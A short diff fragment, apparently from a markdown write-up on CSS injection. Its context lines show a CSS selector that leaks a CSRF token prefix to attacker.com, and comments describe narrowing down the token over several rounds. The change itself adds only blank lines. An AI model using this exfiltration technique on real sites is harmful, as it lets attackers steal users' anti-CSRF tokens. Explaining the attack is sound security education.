@@ -276,3 +276,5 @@ input[name="csrf"][value^="ab"] { background: url(https://attacker.com/?token=ab
 /* Server returns CSS with selectors for next character based on round 1 results */
 /* Each round narrows down the token value */
 ```
+
+
